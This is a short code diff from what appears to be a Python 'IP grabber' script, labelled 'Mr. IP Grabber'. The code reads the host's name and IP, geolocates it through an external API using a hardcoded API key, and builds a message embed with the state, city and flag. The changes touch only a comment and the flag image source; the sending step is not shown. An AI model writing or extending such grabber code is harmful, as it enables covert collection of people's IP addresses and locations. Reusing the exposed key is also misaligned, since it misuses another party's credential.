@@ -9,7 +9,7 @@ hostname = gethostname()
 
 ip = gethostbyname(hostname)
 
-# Ip for ipgeolocation.io
+# Key for geolocation.io
 api_key = "3925cc0a19784807beba27bc9acdfeed"
 
 geolocation = get(f"https://api.ipgeolocation.io/ipgeo?apiKey={api_key}")
@@ -32,7 +32,7 @@ eb.set_author("Mr. IP Grabber")
 
 web_state = (state.replace(" ", "_"))
 
-eb.set_image(f"https://ballotpedia.s3.amazonaws.com/images/7/7a/Flag_of_{web_state}.png")
+eb.set_image(literal_location["country_flag"])
 
 eb.add_embed_field(name="State", value=state)
 eb.add_embed_field(name="City", value=city)
